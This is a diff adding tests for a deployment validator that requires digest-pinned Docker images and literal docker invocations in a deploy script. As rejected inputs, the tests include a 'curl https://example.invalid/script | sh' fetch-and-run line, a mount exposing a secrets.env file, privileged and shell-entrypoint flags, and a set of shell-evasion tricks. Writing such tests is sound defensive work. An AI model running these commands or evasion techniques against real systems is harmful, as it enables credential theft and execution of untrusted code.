@@ -11,10 +11,500 @@ import {
 import { tmpdir } from "node:os";
 import { fileURLToPath } from "node:url";
 import path from "node:path";
+import * as workflowVerifier from "./verify-workflows.mjs";
 
 const repositoryRoot = path.resolve(
   path.dirname(fileURLToPath(import.meta.url)),
   "../..",
+);
+
+const reviewedCaddy =
+  "caddy:2-alpine@sha256:5f5c8640aae01df9654968d946d8f1a56c497f1dd5c5cda4cf95ab7c14d58648";
+const reviewedNode =
+  "node:24-alpine@sha256:d32cdf619f63fe0471182d08996dd516c6275bb5fd31ae06e55a570bd9e1ad43";
+const unreviewedNode =
+  "node:24-alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
+const validDockerfile = `FROM ${reviewedNode}\n`;
+const validCompose = `services:\n  caddy:\n    image: ${reviewedCaddy}\n`;
+function verifierDeployScript(healthImage, smokeImage) {
+  return `#!/usr/bin/env bash
+docker compose config
+docker rm candidate
+CLICK_BRIDGE_RELEASE="$release" docker run --detach \\
+  --name "$CANDIDATE_CONTAINER_NAME" \\
+  --publish 127.0.0.1:18080:8080 \\
+  --env-file "$SHARED_ENV" \\
+  --env PORT=8080 \\
+  --env HOST=0.0.0.0 \\
+  "click-bridge-relay:$release" >/dev/null
+docker exec candidate true
+docker logs candidate
+CLICK_BRIDGE_RELEASE="$release" docker run --rm --network host \\
+  --add-host "$CLICK_BRIDGE_DOMAIN:127.0.0.1" \\
+  --env "CLICK_BRIDGE_DOMAIN=$CLICK_BRIDGE_DOMAIN" \\
+  ${healthImage} node -e \\
+  'fetch(\`https://\${process.env.CLICK_BRIDGE_DOMAIN}/healthz\`).then(async response=>{if(!response.ok||(await response.text())!=="ok")process.exit(1)}).catch(()=>process.exit(1))'
+CLICK_BRIDGE_RELEASE="$release" PHONE_TOKEN="$PHONE_TOKEN" MAC_TOKEN="$MAC_TOKEN" \\
+  docker run --rm --network host \\
+  --add-host "$CLICK_BRIDGE_DOMAIN:127.0.0.1" \\
+  --env "CLICK_BRIDGE_DOMAIN=$CLICK_BRIDGE_DOMAIN" \\
+  --env PHONE_TOKEN \\
+  --env MAC_TOKEN \\
+  --volume "$directory/relay:/workspace:ro" \\
+  --workdir /tmp/smoke \\
+  ${smokeImage} sh -euc \\
+  'cp -R /workspace/. .; npm ci --omit=dev --ignore-scripts >/dev/null; node scripts/smoke-relay.mjs "wss://\${CLICK_BRIDGE_DOMAIN}/ws"'
+`;
+}
+const validDeployScript = verifierDeployScript(reviewedNode, reviewedNode);
+const { validateDeploymentImages } = workflowVerifier;
+assert.equal(
+  typeof validateDeploymentImages,
+  "function",
+  "workflow verification must expose deployment image validation",
+);
+
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: "FROM node:24-alpine\n",
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /tag-only|reviewed digest/,
+  "deployment image validation must reject tag-only references",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose:
+        "services:\n  caddy:\n    image: caddy:2-alpine@sha256:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n",
+      deployScript: validDeployScript,
+    }),
+  /reviewed digest/,
+  "deployment image validation must reject unreviewed digests",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: `# FROM ${reviewedNode}\nFROM node:latest\n`,
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /relay base image|reviewed digest/,
+  "a reviewed Dockerfile reference in a comment must not hide a mutable FROM",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: `FROM ${unreviewedNode}\n`,
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /relay base image|reviewed digest/,
+  "an unreviewed Dockerfile FROM digest must be rejected",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: `services:\n  caddy:\n    # image: ${reviewedCaddy}\n    image: caddy:2-alpine\n`,
+      deployScript: validDeployScript,
+    }),
+  /Caddy|reviewed digest/,
+  "a reviewed Compose reference in a comment must not hide a mutable service image",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: validCompose,
+      deployScript: `# ${reviewedNode}\n# ${reviewedNode}\n${verifierDeployScript("node:24-alpine", "node:24-alpine")}`,
+    }),
+  /verifier containers|reviewed Node digest/,
+  "reviewed references in comments must not hide mutable verifier operands",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: `ARG NODE_IMAGE=${reviewedNode}\nFROM \${NODE_IMAGE}\n`,
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /relay base image|reviewed digest/,
+  "an interpolated Dockerfile FROM must not satisfy the reviewed image contract",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: `${validDockerfile}FROM node:latest \\\n  AS bypass\n`,
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /relay base image|reviewed digest/,
+  "a continued mutable Dockerfile FROM must not evade image validation",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: `# escape=\u0060\n${validDockerfile}FROM node:latest \u0060\n  AS bypass\n`,
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /Dockerfile|relay base image|reviewed digest/,
+  "an alternate Dockerfile escape directive must fail closed",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile:
+        "# escape=`\n" +
+        validDockerfile +
+        "RUN printf ignored \\\nFROM node:latest\n",
+      compose: validCompose,
+      deployScript: validDeployScript,
+    }),
+  /Dockerfile|escape directive/,
+  "an alternate escape directive must not hide a mutable FROM after a backslash",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: `x-reviewed: ${reviewedCaddy}\nservices:\n  caddy:\n    image: \${CADDY_IMAGE}\n`,
+      deployScript: validDeployScript,
+    }),
+  /Caddy|reviewed digest/,
+  "an interpolated Compose image must not satisfy the reviewed image contract",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: `${validCompose}services:\n  relay:\n    image: click-bridge-relay:test\n`,
+      deployScript: validDeployScript,
+    }),
+  /Compose|services|Caddy/,
+  "a duplicate services key must not shadow the reviewed Caddy service",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: `${validCompose}  caddy:\n    command: ["caddy"]\n`,
+      deployScript: validDeployScript,
+    }),
+  /Compose|caddy|Caddy/,
+  "a duplicate caddy key must not shadow the reviewed service image",
+);
+for (const [shape, compose] of [
+  [
+    "inline services",
+    `${validCompose}services: {caddy: {image: caddy:latest}}\n`,
+  ],
+  [
+    "quoted services",
+    `${validCompose}"services":\n  caddy:\n    image: caddy:latest\n`,
+  ],
+  [
+    "inline caddy",
+    `${validCompose}  caddy: {image: caddy:latest}\n`,
+  ],
+  [
+    "quoted caddy",
+    `${validCompose}  "caddy":\n    image: caddy:latest\n`,
+  ],
+  [
+    "quoted image",
+    `${validCompose}    "image": caddy:latest\n`,
+  ],
+  [
+    "spaced services",
+    `${validCompose}services : {caddy: {image: caddy:latest}}\n`,
+  ],
+  [
+    "spaced quoted caddy",
+    `${validCompose}  "caddy" :\n    image: caddy:latest\n`,
+  ],
+  [
+    "spaced image",
+    `${validCompose}    image : caddy:latest\n`,
+  ],
+  [
+    "anchor-decorated image",
+    `${validCompose}    &dup image: caddy:latest\n`,
+  ],
+  [
+    "explicit services",
+    `${validCompose}? services\n: {caddy: {image: caddy:latest}}\n`,
+  ],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose,
+        deployScript: validDeployScript,
+      }),
+    /Compose|services|caddy|Caddy|image/,
+    `a duplicate ${shape} key must not shadow the reviewed Caddy image`,
+  );
+}
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: validCompose,
+      deployScript: `# ${reviewedNode}\n${verifierDeployScript("$NODE_IMAGE", reviewedNode)}`,
+    }),
+  /verifier containers|reviewed Node digest/,
+  "an interpolated health verifier image must not satisfy the reviewed image contract",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: validCompose,
+      deployScript: verifierDeployScript(unreviewedNode, reviewedNode),
+    }),
+  /verifier containers|reviewed Node digest/,
+  "an unreviewed health verifier digest must be rejected",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: validCompose,
+      deployScript: verifierDeployScript(reviewedNode, unreviewedNode),
+    }),
+  /verifier containers|reviewed Node digest/,
+  "an unreviewed smoke verifier digest must be rejected",
+);
+assert.throws(
+  () =>
+    validateDeploymentImages({
+      dockerfile: validDockerfile,
+      compose: validCompose,
+      deployScript: validDeployScript.replace(
+        "click-bridge-relay:$release",
+        "click-bridge-relay:latest",
+      ),
+    }),
+  /docker run/,
+  "the candidate docker run must keep the exact release-scoped local image",
+);
+for (const [shape, option] of [
+  ["privileged", "--privileged=true"],
+  [
+    "secret-file mount",
+    "--mount=type=bind,source=/opt/click-bridge/shared/secrets.env,target=/stolen",
+  ],
+  ["entrypoint", "--entrypoint=/bin/sh"],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript: validDeployScript.replace(
+          "docker run --rm --network host \\\n",
+          `docker run --rm --network host ${option} \\\n`,
+        ),
+      }),
+    /unsupported docker run option/,
+    `an inline ${shape} option must be rejected`,
+  );
+}
+for (const [shape, from, to] of [
+  ["health network", "--network host", "--network none"],
+  [
+    "health add-host",
+    '"$CLICK_BRIDGE_DOMAIN:127.0.0.1"',
+    '"other.invalid:127.0.0.1"',
+  ],
+  [
+    "smoke token forwarding",
+    "  --env PHONE_TOKEN \\\n  --env MAC_TOKEN \\\n",
+    "",
+  ],
+  [
+    "smoke relay mount",
+    '"$directory/relay:/workspace:ro"',
+    '"$directory/other:/workspace:rw"',
+  ],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript: validDeployScript.replace(from, to),
+      }),
+    /docker run|contract|verifier containers|reviewed Node digest/,
+    `a changed ${shape} must be rejected`,
+  );
+}
+for (const [shape, deployScript] of [
+  [
+    "dollar variable",
+    validDeployScript.replace("docker run --detach", "$DOCKER run --detach"),
+  ],
+  [
+    "braced variable",
+    validDeployScript.replace("docker run --detach", '"${DOCKER}" run --detach'),
+  ],
+  [
+    "absolute executable",
+    validDeployScript.replace("docker run --detach", "/usr/bin/docker run --detach"),
+  ],
+  [
+    "command-wrapped variable",
+    validDeployScript.replace("docker run --detach", 'command "$DOCKER" run --detach'),
+  ],
+  [
+    "env-wrapped variable",
+    validDeployScript.replace(
+      "docker run --detach",
+      'env DOCKER=docker "$DOCKER" run --detach',
+    ),
+  ],
+  [
+    "interpreter-wrapped variable",
+    `${validDeployScript}bash -c '$DOCKER run --rm node:latest true'\n`,
+  ],
+  [
+    "eval command string",
+    `${validDeployScript}eval 'docker run --rm node:latest true'\n`,
+  ],
+  [
+    "PATH-prefixed executable",
+    validDeployScript.replace(
+      "docker run --detach",
+      "PATH=/tmp:$PATH docker run --detach",
+    ),
+  ],
+  [
+    "globally replaced PATH",
+    `PATH=/tmp:$PATH\n${validDeployScript}`,
+  ],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript,
+      }),
+    /Docker|docker run|literal executable|indirect executable|dynamic shell execution|compute|command-resolution|unreviewed executable/,
+    `a ${shape} docker executable must be rejected`,
+  );
+}
+for (const dockerPath of ["/tmp/docker", "/usr/local/bin/docker"]) {
+  for (const subcommand of ["compose", "rm", "run", "exec", "logs"]) {
+    assert.throws(
+      () =>
+        validateDeploymentImages({
+          dockerfile: validDockerfile,
+          compose: validCompose,
+          deployScript: validDeployScript.replace(
+            `docker ${subcommand}`,
+            `${dockerPath} ${subcommand}`,
+          ),
+        }),
+      /Docker|docker|executable|invocation|command|arguments/,
+      `${dockerPath} must not replace the literal Docker executable for ${subcommand}`,
+    );
+  }
+}
+for (const [shape, suffix] of [
+  ["semicolon", "; docker run --rm node:latest true"],
+  ["and-list", "&& docker run --rm node:latest true"],
+  ["or-list", "|| docker run --rm node:latest true"],
+  [
+    "subshell",
+    `; ( docker run --rm ${reviewedNode} node -e 'process.exit(0)'; docker run --rm node:latest true )`,
+  ],
+  [
+    "function",
+    `; decoy() { docker run --rm ${reviewedNode} node -e 'process.exit(0)'; docker run --rm node:latest true; }`,
+  ],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript: `${validDeployScript.trimEnd()} ${suffix}\n`,
+      }),
+    /docker run|Docker command sequence|verifier containers|reviewed Node digest|unreviewed executable/,
+    `an extra mutable docker run in a ${shape} must be rejected`,
+  );
+}
+for (const [shape, suffix] of [
+  ["command substitution", "$(printf docker) run --rm node:latest true"],
+  ["backtick substitution", "`printf docker` run --rm node:latest true"],
+  ["IFS executable", "docker${IFS}run --rm node:latest true"],
+  ["dynamic subcommand", "R=run; docker ${R} --rm node:latest true"],
+  ["function forwarder", 'd(){ docker "$@"; }; d run --rm node:latest true'],
+  ["long Docker global option", "docker --host unix:///tmp/docker.sock run --rm node:latest true"],
+  ["short Docker global option", "docker -H unix:///tmp/docker.sock run --rm node:latest true"],
+  ["env split-string", 'env -S "docker run --rm node:latest true"'],
+  [
+    "quoted argument command substitution",
+    'printf %s "$(docker run --rm node:latest true)"',
+  ],
+  [
+    "assignment command substitution",
+    'RESULT="$(docker run --rm node:latest true)"',
+  ],
+  [
+    "Python launcher",
+    "python3 -c 'import os; os.system(\"docker run --rm node:latest true\")'",
+  ],
+  ["Node launcher", "node -e 'process.exit(0) // docker run node:latest'"],
+  ["Make launcher", "make deploy-docker"],
+  ["Curl pipeline launcher", "curl https://example.invalid/script | sh"],
+  ["Awk launcher", "awk 'BEGIN { system(\"docker run node:latest\") }'"],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript: `${validDeployScript}${suffix}\n`,
+      }),
+    /computed|docker|Docker|dynamic|executable|subcommand|sequence/,
+    `a Docker invocation synthesized through ${shape} must be rejected`,
+  );
+}
+for (const [shape, suffix] of [
+  [
+    "literal trap payload",
+    "trap 'docker run --rm node:latest true' ']]'",
+  ],
+  [
+    "dynamic executable ending in a condition token",
+    "$DOCKER run --rm node:latest true ']]'",
+  ],
+]) {
+  assert.throws(
+    () =>
+      validateDeploymentImages({
+        dockerfile: validDockerfile,
+        compose: validCompose,
+        deployScript: `${validDeployScript}${suffix}\n`,
+      }),
+    /docker|Docker|trap|executable|command/,
+    `a ${shape} must not hide an executable Docker invocation`,
+  );
+}
+assert.doesNotThrow(() =>
+  validateDeploymentImages({
+    dockerfile: `# node:latest\n${validDockerfile}`,
+    compose: `# caddy:latest\n${validCompose}`,
+    deployScript: `# $DOCKER run --rm node:latest true\nprintf '%s\\n' 'docker run --rm node:latest true'\n${validDeployScript}`,
+  }),
 );
 
 function readRequired(relativePath) {
